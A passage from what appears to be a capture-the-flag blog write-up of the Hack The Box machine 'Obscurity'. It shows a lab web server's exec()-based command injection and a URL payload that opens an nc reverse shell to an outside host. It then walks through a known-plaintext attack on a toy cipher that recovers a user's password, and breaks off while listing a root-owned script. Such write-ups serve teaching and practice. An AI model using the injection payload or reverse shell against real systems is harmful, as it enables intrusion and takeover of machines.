+threading&lt;span style="color:#f92672">.&lt;/span>Thread(target &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>listenToClient,args &lt;span style="color:#f92672">=&lt;/span> (client,address))&lt;span style="color:#f92672">.&lt;/span>start()
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">listenToClient&lt;/span>(self, client, address):
+size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>
+&lt;span style="color:#66d9ef">while&lt;/span> True:
+&lt;span style="color:#66d9ef">try&lt;/span>:
+data &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>recv(size)
+&lt;span style="color:#66d9ef">if&lt;/span> data:
+&lt;span style="color:#75715e"># Set the response to echo back the recieved data &lt;/span>
+req &lt;span style="color:#f92672">=&lt;/span> Request(data&lt;span style="color:#f92672">.&lt;/span>decode())
+self&lt;span style="color:#f92672">.&lt;/span>handleRequest(req, client, address)
+client&lt;span style="color:#f92672">.&lt;/span>shutdown()
+client&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">raise&lt;/span> error(&lt;span style="color:#e6db74">&amp;#39;Client disconnected&amp;#39;&lt;/span>)
+&lt;span style="color:#66d9ef">except&lt;/span>:
+client&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;span style="color:#66d9ef">return&lt;/span> False
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">handleRequest&lt;/span>(self, request, conn, address):
+&lt;span style="color:#66d9ef">if&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>good:
+&lt;span style="color:#75715e"># try:&lt;/span>
+&lt;span style="color:#75715e"># print(str(request.method) + &amp;#34; &amp;#34; + str(request.doc), end=&amp;#39; &amp;#39;)&lt;/span>
+&lt;span style="color:#75715e"># print(&amp;#34;from {0}&amp;#34;.format(address[0]))&lt;/span>
+&lt;span style="color:#75715e"># except Exception as e:&lt;/span>
+&lt;span style="color:#75715e"># print(e)&lt;/span>
+document &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>serveDoc(request&lt;span style="color:#f92672">.&lt;/span>doc, DOC_ROOT)
+statusNum&lt;span style="color:#f92672">=&lt;/span>document[&lt;span style="color:#e6db74">&amp;#34;status&amp;#34;&lt;/span>]
+&lt;span style="color:#66d9ef">else&lt;/span>:
+document &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>serveDoc(&lt;span style="color:#e6db74">&amp;#34;/errors/400.html&amp;#34;&lt;/span>, DOC_ROOT)
+statusNum&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;400&amp;#34;&lt;/span>
+body &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>]
+statusCode&lt;span style="color:#f92672">=&lt;/span>CODES[statusNum]
+dateSent &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+server &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;BadHTTPServer&amp;#34;&lt;/span>
+modified &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+length &lt;span style="color:#f92672">=&lt;/span> len(body)
+contentType &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#e6db74">&amp;#34;mime&amp;#34;&lt;/span>] &lt;span style="color:#75715e"># Try and identify MIME type from string&lt;/span>
+connectionType &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Closed&amp;#34;&lt;/span>
+resp &lt;span style="color:#f92672">=&lt;/span> Response(
+statusNum&lt;span style="color:#f92672">=&lt;/span>statusNum, statusCode&lt;span style="color:#f92672">=&lt;/span>statusCode,
+dateSent &lt;span style="color:#f92672">=&lt;/span> dateSent, server &lt;span style="color:#f92672">=&lt;/span> server,
+modified &lt;span style="color:#f92672">=&lt;/span> modified, length &lt;span style="color:#f92672">=&lt;/span> length,
+contentType &lt;span style="color:#f92672">=&lt;/span> contentType, connectionType &lt;span style="color:#f92672">=&lt;/span> connectionType,
+body &lt;span style="color:#f92672">=&lt;/span> body
+)
+data &lt;span style="color:#f92672">=&lt;/span> resp&lt;span style="color:#f92672">.&lt;/span>stringResponse()
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> data:
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
+conn&lt;span style="color:#f92672">.&lt;/span>send(data&lt;span style="color:#f92672">.&lt;/span>encode())
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">serveDoc&lt;/span>(self, path, docRoot):
+path &lt;span style="color:#f92672">=&lt;/span> urllib&lt;span style="color:#f92672">.&lt;/span>parse&lt;span style="color:#f92672">.&lt;/span>unquote(path)
+&lt;span style="color:#66d9ef">try&lt;/span>:
+info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;output = &amp;#39;Document: {}&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#75715e"># Keep the output for later debug&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(info&lt;span style="color:#f92672">.&lt;/span>format(path))
+&lt;span style="color:#66d9ef">exec&lt;/span>(info&lt;span style="color:#f92672">.&lt;/span>format(path)) &lt;span style="color:#75715e"># This is how you do string formatting, right?&lt;/span>
+cwd &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>dirname(os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>realpath(__file__))
+docRoot &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(cwd, docRoot)
+&lt;span style="color:#66d9ef">if&lt;/span> path &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>:
+path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/index.html&amp;#34;&lt;/span>
+requested &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(docRoot, path[&lt;span style="color:#ae81ff">1&lt;/span>:])
+&lt;span style="color:#66d9ef">if&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>isfile(requested):
+mime &lt;span style="color:#f92672">=&lt;/span> mimetypes&lt;span style="color:#f92672">.&lt;/span>guess_type(requested)
+mime &lt;span style="color:#f92672">=&lt;/span> (mime &lt;span style="color:#66d9ef">if&lt;/span> mime[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> None &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#e6db74">&amp;#34;text/html&amp;#34;&lt;/span>)
+mime &lt;span style="color:#f92672">=&lt;/span> MIMES[requested&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]]
+&lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;span style="color:#66d9ef">with&lt;/span> open(requested, &lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;span style="color:#66d9ef">except&lt;/span>:
+&lt;span style="color:#66d9ef">with&lt;/span> open(requested, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+status &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;200&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+errorPage &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(docRoot, &lt;span style="color:#e6db74">&amp;#34;errors&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;404.html&amp;#34;&lt;/span>)
+mime &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;text/html&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">with&lt;/span> open(errorPage, &lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()&lt;span style="color:#f92672">.&lt;/span>format(path)
+status &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;404&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> e:
+&lt;span style="color:#66d9ef">print&lt;/span>(e)
+errorPage &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(docRoot, &lt;span style="color:#e6db74">&amp;#34;errors&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;500.html&amp;#34;&lt;/span>)
+mime &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;text/html&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">with&lt;/span> open(errorPage, &lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+status &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;500&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>: data, &lt;span style="color:#e6db74">&amp;#34;mime&amp;#34;&lt;/span>: mime, &lt;span style="color:#e6db74">&amp;#34;status&amp;#34;&lt;/span>: status}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>By doing some code-analysis, is possible to see that the function &lt;code>serveDoc()&lt;/code> is vulnerable to a command injection in its line &lt;code>exec(info.format(path)) # This is how you do string formatting, right?&lt;/code> this is because it&amp;rsquo;s making use of &lt;a href="https://docs.python.org/2.0/ref/exec.html">exec&lt;/a> which is not even being sanitized, so in other words&amp;hellip;there is being used a function which executes stuff at OS level while not sanitized, so this is our RCE :)&lt;/p>
+&lt;p>Pst: The hyperlink against the doc of &lt;code>exec&lt;/code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.&lt;/p>
+&lt;h2 id="rce">RCE&lt;/h2>
+&lt;p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.16 4444 &amp;gt;/tmp/f');'
+&lt;/code>&lt;/pre>
+&lt;img src="https://ceso.github.io/images/htb/obscurity/1-rce.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="user">user&lt;/h2>
+&lt;p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called &lt;code>robert&lt;/code> and I list the contents of it&amp;rsquo;s home:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ ls -la /home/robert
+total 60
+drwxr-xr-x 7 robert robert 4096 Dec 2 09:53 .
+drwxr-xr-x 3 root root 4096 Sep 24 22:09 ..
+lrwxrwxrwx 1 robert robert 9 Sep 28 23:28 .bash_history -&amp;gt; /dev/null
+-rw-r--r-- 1 robert robert 220 Apr 4 2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr 4 2018 .bashrc
+drwx------ 2 robert robert 4096 Oct 5 13:09 BetterSSH
+drwx------ 2 robert robert 4096 Oct 3 16:02 .cache
+-rw-rw-r-- 1 robert robert 94 Sep 26 23:08 check.txt
+drwxr-x--- 3 robert robert 4096 Dec 2 09:53 .config
+drwx------ 3 robert robert 4096 Oct 3 22:42 .gnupg
+drwxrwxr-x 3 robert robert 4096 Oct 3 16:34 .local
+-rw-rw-r-- 1 robert robert 185 Oct 4 15:01 out.txt
+-rw-rw-r-- 1 robert robert 27 Oct 4 15:01 passwordreminder.txt
+-rw-r--r-- 1 robert robert 807 Apr 4 2018 .profile
+-rwxrwxr-x 1 robert robert 2514 Oct 4 14:55 SuperSecureCrypt.py
+-rwx------ 1 robert robert 33 Sep 25 14:12 user.txt
+&lt;/code>&lt;/pre>&lt;p>So, we need to compromise &lt;code>robert&lt;/code> and in it&amp;rsquo;s home lies the path&amp;hellip;in the ls is possible to see some interesting files/directorys: &lt;code>BetterSSH&lt;/code>, &lt;code>SuperSecureCrypt.py&lt;/code>, &lt;code>out.txt&lt;/code>, &lt;code>check.txt&lt;/code> and &lt;code>passwordreminder.txt&lt;/code>, we start by checking the content of everything:&lt;/p>
+&lt;p>First, the directory BetterSSH looks interesting, but we can&amp;rsquo;t see what&amp;rsquo;s inside, so let&amp;rsquo;s take note of this as might come handy later.&lt;/p>
+&lt;p>&lt;code>check.txt&lt;/code> has an interesting message:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat check.txt
+Encrypting this file with your key should result in out.txt, make sure your key is correct!
+&lt;/code>&lt;/pre>&lt;p>&lt;code>out.txt&lt;/code> looks like a ciphered message&amp;hellip;(and from the content of &lt;code>check.txt&lt;/code> we know they are related)&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file out.txt
+out.txt: UTF-8 Unicode text, with NEL line terminators
+www-data@obscure:/home/robert$ cat out.txt
+¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
+&lt;/code>&lt;/pre>&lt;p>Same with &lt;code>passwordreminder.txt&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ file passwordreminder.txt
+passwordreminder.txt: UTF-8 Unicode text, with no line terminators
+www-data@obscure:/home/robert$ cat passwordreminder.txt
+´ÑÈÌÉàÙÁÑé¯·¿k
+&lt;/code>&lt;/pre>&lt;p>And finally, the code of &lt;code>SuperSecureCrypt.py&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#f92672">import&lt;/span> argparse
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(text, key):
+keylen &lt;span style="color:#f92672">=&lt;/span> len(key)
+keyPos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+encrypted &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> text:
+keyChr &lt;span style="color:#f92672">=&lt;/span> key[keyPos]
+newChr &lt;span style="color:#f92672">=&lt;/span> ord(x)
+newChr &lt;span style="color:#f92672">=&lt;/span> chr((newChr &lt;span style="color:#f92672">+&lt;/span> ord(keyChr)) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>)
+encrypted &lt;span style="color:#f92672">+=&lt;/span> newChr
+keyPos &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+keyPos &lt;span style="color:#f92672">=&lt;/span> keyPos &lt;span style="color:#f92672">%&lt;/span> keylen
+&lt;span style="color:#66d9ef">return&lt;/span> encrypted
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(text, key):
+keylen &lt;span style="color:#f92672">=&lt;/span> len(key)
+keyPos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+decrypted &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> text:
+keyChr &lt;span style="color:#f92672">=&lt;/span> key[keyPos]
+newChr &lt;span style="color:#f92672">=&lt;/span> ord(x)
+newChr &lt;span style="color:#f92672">=&lt;/span> chr((newChr &lt;span style="color:#f92672">-&lt;/span> ord(keyChr)) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>)
+decrypted &lt;span style="color:#f92672">+=&lt;/span> newChr
+keyPos &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+keyPos &lt;span style="color:#f92672">=&lt;/span> keyPos &lt;span style="color:#f92672">%&lt;/span> keylen
+&lt;span style="color:#66d9ef">return&lt;/span> decrypted
+parser &lt;span style="color:#f92672">=&lt;/span> argparse&lt;span style="color:#f92672">.&lt;/span>ArgumentParser(description&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Encrypt with 0bscura&lt;/span>&lt;span style="color:#ae81ff">\&amp;#39;&lt;/span>&lt;span style="color:#e6db74">s encryption algorithm&amp;#39;&lt;/span>)
+parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#39;-i&amp;#39;&lt;/span>,
+metavar&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;InFile&amp;#39;&lt;/span>,
+type&lt;span style="color:#f92672">=&lt;/span>str,
+help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;The file to read&amp;#39;&lt;/span>,
+required&lt;span style="color:#f92672">=&lt;/span>False)
+parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#39;-o&amp;#39;&lt;/span>,
+metavar&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;OutFile&amp;#39;&lt;/span>,
+type&lt;span style="color:#f92672">=&lt;/span>str,
+help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Where to output the encrypted/decrypted file&amp;#39;&lt;/span>,
+required&lt;span style="color:#f92672">=&lt;/span>False)
+parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#39;-k&amp;#39;&lt;/span>,
+metavar&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Key&amp;#39;&lt;/span>,
+type&lt;span style="color:#f92672">=&lt;/span>str,
+help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Key to use&amp;#39;&lt;/span>,
+required&lt;span style="color:#f92672">=&lt;/span>False)
+parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#39;-d&amp;#39;&lt;/span>, action&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;store_true&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Decrypt mode&amp;#39;&lt;/span>)
+args &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
+banner &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;################################&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner&lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;# BEGINNING #&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner&lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;# SUPER SECURE ENCRYPTOR #&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner&lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;################################&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34; ############################&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34; # FILE MODE #&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
+banner &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34; ############################&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(banner)
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>o &lt;span style="color:#f92672">==&lt;/span> None &lt;span style="color:#f92672">or&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>k &lt;span style="color:#f92672">==&lt;/span> None &lt;span style="color:#f92672">or&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>i &lt;span style="color:#f92672">==&lt;/span> None:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Missing args&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>d:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Opening file {0}...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(args&lt;span style="color:#f92672">.&lt;/span>i))
+&lt;span style="color:#66d9ef">with&lt;/span> open(args&lt;span style="color:#f92672">.&lt;/span>i, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>, encoding&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;UTF-8&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Decrypting...&amp;#34;&lt;/span>)
+decrypted &lt;span style="color:#f92672">=&lt;/span> decrypt(data, args&lt;span style="color:#f92672">.&lt;/span>k)
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Writing to {0}...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(args&lt;span style="color:#f92672">.&lt;/span>o))
+&lt;span style="color:#66d9ef">with&lt;/span> open(args&lt;span style="color:#f92672">.&lt;/span>o, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>, encoding&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;UTF-8&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+f&lt;span style="color:#f92672">.&lt;/span>write(decrypted)
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Opening file {0}...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(args&lt;span style="color:#f92672">.&lt;/span>i))
+&lt;span style="color:#66d9ef">with&lt;/span> open(args&lt;span style="color:#f92672">.&lt;/span>i, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>, encoding&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;UTF-8&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Encrypting...&amp;#34;&lt;/span>)
+encrypted &lt;span style="color:#f92672">=&lt;/span> encrypt(data, args&lt;span style="color:#f92672">.&lt;/span>k)
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Writing to {0}...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(args&lt;span style="color:#f92672">.&lt;/span>o))
+&lt;span style="color:#66d9ef">with&lt;/span> open(args&lt;span style="color:#f92672">.&lt;/span>o, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>, encoding&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;UTF-8&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+f&lt;span style="color:#f92672">.&lt;/span>write(encrypted)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&amp;rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&amp;hellip;
+Then we proceed to execute the script with &lt;code>out.txt&lt;/code> as input and &lt;code>check.txt&lt;/code> as the key, saving the output (the key), under tmp as &lt;code>foobar&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &amp;quot;$( cat check.txt )&amp;quot; -o /tmp/foobar -d
+################################
+# BEGINNING #
+# SUPER SECURE ENCRYPTOR #
+################################
+############################
+# FILE MODE #
+############################
+Opening file out.txt...
+Decrypting...
+Writing to /tmp/foobar...
+www-data@obscure:/home/robert$ cat /tmp/foobar
+cat /tmp/foobar
+alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
+&lt;/code>&lt;/pre>&lt;p>Now, we are able to decipher &lt;code>passwordreminder.txt&lt;/code> providing the key we got before, getting then the content of &lt;code>passwordreminder.txt&lt;/code> and highly likely the password of the user itself:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
+################################
+# BEGINNING #
+# SUPER SECURE ENCRYPTOR #
+################################
+############################
+# FILE MODE #
+############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to /tmp/pass...
+www-data@obscure:/home/robert$ cat /tmp/pass
+cat /tmp/pass
+SecThruObsFTW
+&lt;/code>&lt;/pre>&lt;p>Now we try to do &lt;code>su - robert&lt;/code> with the retrived password, and we are &lt;code>robert&lt;/code> :)&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">www-data@obscure:/home/robert$ cat /tmp/pass
+cat /tmp/pass
+SecThruObsFTW
+www-data@obscure:/home/robert$ su - robert
+su - robert
+Password: SecThruObsFTW
+robert@obscure:~$
+&lt;/code>&lt;/pre>&lt;h2 id="root">root&lt;/h2>
+&lt;p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are &lt;code>robert&lt;/code>, it&amp;rsquo;s possible for us to see what&amp;rsquo;s inside &lt;code>BetterSSH&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">$ ls -la BetterSSH
+total 12
+drwxr-xr-x 2 root root 4096 Dec 2 09:47 .
+drwxr-xr-x 7 robert robert 4096 Dec 2 09:53 ..
+-rwxr-xr-x 1 root root 1805 Oct 5 13:09 BetterSSH.py
+&lt;/code>&lt;/pre>&lt;p>There is a script called &lt;code>BetterSSH.py&lt;/code>, we check it&amp;rsquo;s code which is:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#f92672">import&lt;/span> random&lt;span style="color:#f92672">,&lt;/span> string
+&lt;span style="color:#f92672">import&lt;/span> os
+&lt;span style="color:#f92672">import&lt;/span> time
+&lt;span style="color:#f92672">import&lt;/span> crypt
+&lt;span style="color:#f92672">import&lt;/span> traceback
+&lt;span style="color:#f92672">import&lt;/span> subprocess
